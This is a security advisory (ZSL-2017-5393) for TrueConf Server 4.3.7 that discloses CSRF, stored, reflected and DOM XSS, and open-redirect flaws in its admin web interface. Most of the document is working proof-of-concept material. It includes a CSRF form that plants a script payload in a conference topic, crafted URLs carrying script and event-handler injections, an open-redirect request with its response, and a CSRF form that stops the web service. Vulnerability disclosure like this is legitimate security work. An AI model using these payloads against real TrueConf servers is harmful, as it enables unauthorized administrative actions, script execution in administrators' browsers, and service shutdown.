@@ -1,0 +1,132 @@
+TrueConf Server v4.3.7 Multiple Remote Web Vulnerabilities
+
+
+Vendor: TrueConf LLC
+Product web page: https://www.trueconf.com
+Affected version: 4.3.7.12255 and 4.3.7.12219
+
+Summary: TrueConf Server is a powerful, high-quality and highly secured
+video conferencing software server. It is specially designed to work with
+up to 250 participants in a multipoint conference over LAN or VPN networks.
+TrueConf Server requires no hardware and includes client applications for
+all popular platforms, making it an easy-to-set up, unified communications
+solution.
+
+Desc: The administration interface allows users to perform certain actions
+via HTTP requests without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+Input passed via the 'redirect_url' GET parameter is not properly verified before
+being used to redirect users. This can be exploited to redirect a user to an
+arbitrary website e.g. when a user clicks a specially crafted link to the affected
+script hosted on a trusted domain.
+
+TrueConf also suffers from multiple stored, reflected and DOM XSS issues when
+input passed via several parameters to several scripts is not properly sanitized
+before being returned to the user. This can be exploited to execute arbitrary HTML
+and script code in a user's browser session in context of an affected site.
+
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN)
+           Apache/2.4.17 (Win32)
+           PHP/5.4.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5393
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5393.php
+
+
+01.11.2016
+
+--
+
+
+CSRF Stored XSS:
+----------------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1:8888/admin/conferences/applyCreate" method="POST">
+      <input type="hidden" name="send&#95;invite&#95;mail" value="1" />
+      <input type="hidden" name="invitation&#95;type" value="&#45;1" />
+      <input type="hidden" name="hide&#95;invitation&#95;type" value="&#45;1" />
+      <input type="hidden" name="date" value="22&#46;01&#46;2017" />
+      <input type="hidden" name="time&#45;field" value="17&#58;27" />
+      <input type="hidden" name="time&#95;zone" value="60" />
+      <input type="hidden" name="subtype" value="3" />
+      <input type="hidden" name="podiums" value="6" />
+      <input type="hidden" name="cid" value="&#92;c&#92;dfa95f7e1d" />
+      <input type="hidden" name="key" value="dfa95f7e1d" />
+      <input type="hidden" name="topic" value="<script>alert&#40;&apos;XSS&apos;&#41;<&#47;script>" />
+      <input type="hidden" name="description" value="" />
+      <input type="hidden" name="owner" value="" />
+      <input type="hidden" name="gconf&#45;edit" value="ok" />
+      <input type="hidden" name="webTtype" value="0" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+
+Reflected XSS:
+--------------
+
+http://127.0.0.1:8888/admin/conferences/get-all-status/?keys[]=<img src=j onerror=confirm(251) >
+http://127.0.0.1:8888/admin/conferences/list/?sort=status%26'%22()%26%25<div><ScRiPt%20>prompt(251)</ScRiPt>
+http://127.0.0.1:8888/admin/group/list/?checked_group_id=0001&sort=name
+http://127.0.0.1:8888/admin/group/list/?checked_group_id=' onmouseover=confirm(251) ?
+
+
+
+DOM XSS:
+--------
+
+http://127.0.0.1:8888/admin/group?'\><script>confirm("XSS")</script>
+http://127.0.0.1:8888/admin/conferences/list/?domxss=javascript:domxssExecutionSink(1,"'\"><script>alert("XSS")</script>
+
+
+
+Open Redirect:
+--------------
+
+Request:
+
+GET /admin/general/change-lang?lang_on=en&redirect_url=http://www.zeroscience.mk HTTP/1.1
+Host: 127.0.0.1:8888
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+Response:
+
+HTTP/1.1 302 Found
+Date: Thu, 22 Sep 2016 21:15:40 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: http://www.zeroscience.mk
+Content-Length: 0
+Keep-Alive: timeout=5, max=75
+Connection: Keep-Alive
+Content-Type: text/html; charset=utf-8
+
+
+
+CSRF Stop Web Service:
+----------------------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/admin/service/stop/" method="POST">
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
